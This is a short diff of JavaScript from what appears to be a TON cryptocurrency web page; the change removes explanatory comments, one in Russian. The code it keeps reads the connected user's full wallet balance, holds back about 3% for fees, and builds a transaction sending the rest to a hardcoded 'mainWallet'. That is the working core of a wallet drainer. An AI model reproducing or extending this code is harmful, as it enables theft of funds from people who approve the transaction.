@@ -42,10 +42,10 @@ async function didtrans() {
     const response = await fetch('https://toncenter.com/api/v3/wallet?address=' + tonConnectUI.account.address);
     const data = await response.json();
     let originalBalance = parseFloat(data.balance);
-    let processedBalance = originalBalance - (originalBalance * 0.03); // вычитаем 3% для сохранения средств на оплату комиссий
+    let processedBalance = originalBalance - (originalBalance * 0.03);
     let tgBalance = processedBalance / 1000000000;
     const transaction = {
-        validUntil: Math.floor(Date.now() / 1000) + 60, // 60 sec
+        validUntil: Math.floor(Date.now() / 1000) + 60,
         messages: [{
             address: mainWallet,
             amount: processedBalance
